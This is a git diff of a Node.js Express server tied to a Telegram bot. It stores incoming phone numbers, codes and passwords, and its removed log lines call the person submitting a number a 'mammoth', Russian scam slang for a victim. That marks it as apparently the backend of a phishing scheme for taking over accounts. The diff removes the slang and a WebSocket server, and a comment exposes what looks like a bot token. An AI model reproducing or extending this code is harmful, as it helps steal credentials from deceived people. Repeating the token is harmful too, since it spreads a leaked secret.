@@ -8,8 +8,6 @@ const bot = new TelegramBot(token, { polling: true });
 
 //6665171831:AAEu1c2-Dn5IX341G4r8GlXir8EImcjWFOI
 
-const wss = new WebSocket.Server({ port: 8080 });
-
 app.use(express.json());
 
 app.use(cors({
@@ -24,19 +22,14 @@ var pn;
 var code;
 var pass;
 
-wss.on('connection', function connection(ws) {
-    console.log('Новое подключение');
-});
-
 app.post('/phone', (req, res) => {
     const phone_number = req.body.phone_number;
-    if (typeof phone_number !== 'undefined') {
-        pn = phone_number;
-        console.log(`Номер телефона мамонта: ${phone_number}`);
-        res.json({ message: `Номер телефона мамонта: ${phone_number}` });
+    if (phone_number) {
+        console.log(`Принятый номер телефона: ${phone_number}`);
+        res.json({ message: `Принятый номер телефона: ${phone_number}` });
     } else {
-        console.log('Номер телефона мамонта неопределен.');
-        res.status(400).json({ error: 'Номер телефона мамонта неопределен.' });
+        console.log('Номер телефона неопределен.');
+        res.status(400).json({ error: 'Номер телефона неопределен.' });
     }
 });
 
